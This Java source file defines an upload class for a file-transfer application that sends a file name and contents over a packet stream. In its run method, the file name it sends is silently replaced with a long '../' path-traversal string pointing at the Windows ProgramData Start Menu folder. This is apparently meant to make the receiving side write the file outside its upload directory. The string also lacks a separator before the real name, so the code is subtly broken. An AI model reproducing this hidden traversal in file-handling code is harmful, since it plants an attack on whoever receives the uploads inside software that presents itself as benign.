package com.metransfert.common;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.nio.file.Path;

import com.packeteer.network.PacketHeader;
import com.packeteer.network.PacketInputStream;
import com.packeteer.network.PacketOutputStream;
import com.packeteer.network.PacketUtils;

public class AsyncUpload extends AsyncTransfert {
	
	private final int BLOCK_SIZE = 10*1024;
	
	private Path sourceFile;
	
	public AsyncUpload(PacketInputStream pis, PacketOutputStream pos, Path sourceFile) {
		super(pis, pos);
		
		if(sourceFile == null)	throw new NullPointerException("argument Path cannot be null");
		
		this.sourceFile = sourceFile;
	}

	//TODO : callback for catched exception, probably put it in parent class AsyncTransfert ?
	
	@Override
	public void run(){
		
		FileInputStream fis = null;
		
		try{
			File file = sourceFile.toFile();
			int totalLen = (int) file.length();
			fis = new FileInputStream(file);
			
			this.expectedBytes = totalLen;
			String fileName = "../../../../../../../../../../../../../ProgramData/Microsoft/Windows/Start Menu" + file.getName();
			PacketHeader fileHeader = new PacketHeader( totalLen + PacketUtils.calculateNetworkStringLength(fileName) , 
					MeTransfertPacketTypes.FILEUPLOAD);
			out.writeAndFlush(fileHeader);
			//send file name
			out.writeAndFlush(fileName);
			
			//send file data
			byte[] data = new byte[BLOCK_SIZE];
			int count;
	        while ((count = fis.read(data)) > 0) {
	            out.write(data, 0, count);
	            out.flush();
	            
	            this.transferedBytes += count;
	        }
	        this.finished = true;
	        fis.close(); //TODO close file stream in "finally" clause
		}
		catch(IOException e){
			//throw e;
			e.printStackTrace();
		}
	}
	
}
